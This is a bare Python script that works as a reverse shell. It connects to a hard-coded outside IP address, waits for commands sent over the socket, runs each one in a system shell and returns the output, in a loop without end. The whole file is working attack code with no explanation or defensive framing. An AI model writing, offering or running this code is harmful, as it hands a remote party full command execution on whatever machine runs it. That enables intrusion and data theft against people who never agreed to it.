import socket
import subprocess

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('82.202.167.227', 65535))

def shell_command(command):
	return subprocess.check_output(command, shell = True)

while True:
	command = client.recv(2048).decode()
	command_result = shell_command(command)
	client.send(command_result)
